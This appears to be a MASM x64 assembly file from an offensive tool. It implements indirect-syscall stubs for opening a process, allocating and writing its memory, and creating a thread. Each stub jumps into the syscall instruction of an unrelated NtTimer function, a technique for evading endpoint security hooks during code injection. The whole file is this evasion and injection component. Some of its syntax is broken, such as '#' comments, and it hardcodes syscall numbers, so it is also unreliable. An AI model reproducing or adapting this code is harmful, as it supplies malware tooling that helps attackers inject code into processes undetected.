;define all variables and declare as external 
EXTERN CSSN:DWORD                
EXTERN OPSSN:DWORD          
EXTERN CTSSN:DWORD       
EXTERN WVMSSN:DWORD   
EXTERN WFSOSSN:DWORD  
EXTERN AVMSSN:DWORD

EXTERN NtCreateTimerSyscall:QWORD
EXTERN NtOpenTimerSyscall:QWORD
EXTERN NtSetTimerSyscall:QWORD
EXTERN NtQueryTimerSyscall:QWORD
EXTERN NtCancelTimerSyscall:QWORD

.CODE

#define syscalls for NTDLL calls

#NtOpenProcess syscall, making call through NtCreateTimer
OP PROC
		mov r10, rcx
		mov eax, 26h
		jmp qword ptr [NtCreateTimerSyscall]
		ret
OP ENDP

#NtAllocateVirtualMemory syscall, making call through NtOpenTimer
AVM PROC
		mov r10, rcx
		mov eax, 18h
		jmp qword ptr [NtOpenTimerSyscall]
		ret
AVM ENDP

#NtWriteVirtualMemory syscall, making call through NtSetTimer
WVM PROC
		mov r10, rcx
		mov eax, 3ah
		jmp qword ptr [NtSetTimerSyscall]
		ret
WVM ENDP

#NtCreateThread syscall, making call through NtQueryTimer
CT PROC
		mov r10, rcx
		mov eax, 0c7h
		jmp qword ptr [NtQueryTimerSyscall]
		ret
CT ENDP

#NtWaitForSingleObject syscall, making call through NtQueryTimer
WFSO PROC
		mov r10, rcx
		mov eax, 04h
		jmp qword ptr [NtQueryTimerSyscall]
		ret
WFSO ENDP

#NtClose syscall, making call through NtCancelTimer
C PROC
		mov r10, rcx
		mov eax, 0fh
		jmp qword ptr [NtCancelTimerSyscall]
		ret
C ENDP

end
